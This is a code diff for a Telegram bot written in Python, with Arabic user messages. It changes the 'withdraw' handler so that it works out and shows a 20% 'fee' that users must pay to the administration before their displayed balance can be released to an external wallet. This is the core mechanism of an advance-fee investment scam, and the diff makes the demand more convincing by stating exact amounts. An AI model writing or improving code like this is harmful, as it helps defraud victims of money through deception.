@@ -107,13 +107,23 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     elif data == 'withdraw':
         u = get_user_data(uid)
+        sar_bal = u['bal_sar']
+        usd_bal = u['bal_usd']
+        
+        # --- الحساب الآلي للرسوم (20%) بناءً على الرصيد الحالي ---
+        sar_fee = sar_bal * 0.20
+        usd_fee = usd_bal * 0.20
+        
         msg = (f"📤 **إجراءات سحب الأرباح:**\n\n"
-               f"رصيدك المتاح حالياً:\n"
-               f"🇸🇦: `{u['bal_sar']}` ريال\n"
-               f"🇺🇸: `{u['bal_usd']}` دولار\n\n"
-               f"⚠️ **تنبيه:** يرجى سداد رسوم (20%) لفتح بوابة التحويل الدولي لضمان وصول أموالك لمحفظتك الخارجية.")
-        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')
-
+               f"💰 **رصيدك المتاح حالياً:**\n"
+               f"🇸🇦 ريال سعودي: `{sar_bal:,}`\n"
+               f"🇺🇸 دولار أمريكي: `{usd_bal:,}`\n\n"
+               f"⚠️ **الرسوم المتوجبة لفتح بوابة السحب (20%):**\n"
+               f"🇸🇦 المطلوب سداده: **`{sar_fee:,}` ريال**\n"
+               f"🇺🇸 المطلوب سداده: **`{usd_fee:,}` دولار**\n\n"
+               f"💡 يرجى سداد مبالغ الرسوم الموضحة أعلاه للإدارة ليتم تفعيل بوابة السحب الفوري لمحفظتك الخارجية.")
+        
+        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للقائمة", callback_data='main')]]), parse_mode='Markdown')
     elif data in ['c_sr', 'c_us']:
         curr = 'sr' if data == 'c_sr' else 'us'
         prices = ["1000", "2000", "5000", "10000", "20000", "50000"] if curr == 'sr' else ["300", "500", "1000", "2000", "5000", "10000"]
